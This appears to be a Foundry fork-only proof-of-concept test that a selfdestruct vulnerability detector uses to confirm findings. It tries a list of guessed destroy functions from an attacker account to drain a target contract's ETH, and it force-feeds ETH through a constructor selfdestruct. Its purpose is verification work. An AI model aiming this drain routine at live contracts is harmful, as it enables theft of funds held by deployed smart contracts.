// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Selfdestruct: destroy + forced ETH
/// @notice Detector: selfdestruct / bytecode-selfdestruct.
///         (a) destroy(): anyone (or a single key) can selfdestruct the
///             target and sweep its balance to a chosen recipient.
///         (b) forced ETH: selfdestruct ALWAYS force-sends ETH, even to
///             contracts that reject plain transfers -- breaking exact-
///             balance checks and force-funding targets.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. NOTE (Cancun / EIP-6780): selfdestruct in
///      a LATER transaction only moves the balance -- it no longer deletes
///      code. So this PoC asserts the BALANCE moved, not code deletion.
///      The constructor selfdestruct in Forcer still works (same tx as
///      creation).

contract Forcer {
    // Selfdestruct in the constructor: same tx as creation, so the
    // balance transfer still executes post-Cancun.
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Attempt one destroy selector. Success is the BALANCE MOVING, not the call
    /// returning: a no-op or already-guarded function returns successfully and
    /// sweeps nothing. Observed on a real run — `kill()` returned [Stop], moved
    /// 0 wei, and a single-candidate harness reported "not reproduced".
    function _attempt(
        address attacker,
        uint256 before,
        string memory label,
        bytes memory data
    ) internal returns (string memory) {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && target.balance < before) return label;
        return "";
    }

    /// The destroy entry point is a GUESS when the target is unverified, and a
    /// wrong guess is not harmless: it reports "not reproduced" for a
    /// vulnerability that exists under another name. So try the plausible ones
    /// before concluding.
    function _tryDestroy(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "kill()", abi.encodeWithSignature("kill()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "destroy()", abi.encodeWithSignature("destroy()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "selfdestruct()", abi.encodeWithSignature("selfdestruct()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "terminate()", abi.encodeWithSignature("terminate()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "burn()", abi.encodeWithSignature("burn()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "close()", abi.encodeWithSignature("close()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "suicide()", abi.encodeWithSignature("suicide()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "destroy(address)", abi.encodeWithSignature("destroy(address)", attacker));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "kill(address)", abi.encodeWithSignature("kill(address)", attacker));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_destroySweepsBalance() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        uint256 targetBefore = target.balance;
        require(targetBefore > 0, "target holds no ETH to sweep");

        string memory used = _tryDestroy(attackerEOA, targetBefore);
        uint256 drained = targetBefore - target.balance;
        console.log("destroy entry point that moved ETH:", used);
        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        console.log("wei drained:", drained);

        assertGt(
            drained,
            0,
            "no destroy entry point swept the balance. Tried kill(), destroy(), selfdestruct(), terminate(), burn(), close(), suicide(), destroy(address), kill(address). This does NOT establish safety: the destroy function may have another name, take other arguments, or be reachable only by a specific caller."
        );
    }

    function test_forcedEth() public {
        uint256 targetBefore = target.balance;
        // Force-feed 1 ETH via constructor selfdestruct. Works even if
        // the target has no payable fallback and rejects transfers.
        // NOTE: assert >=, not ==. On a fork, the Forcer's deterministic
        // CREATE address may already hold mainnet dust, which the
        // constructor selfdestruct forwards along with the 1 ETH.
        // (Observed: a CREATE address holding 577021548053172 wei.)
        new Forcer{value: 1 ether}(payable(target));
        console.log("target balance before force-feed:", targetBefore);
        console.log("target balance after force-feed:", target.balance);
        assertGe(target.balance, targetBefore + 1 ether, "forced ETH did not land");
    }
}
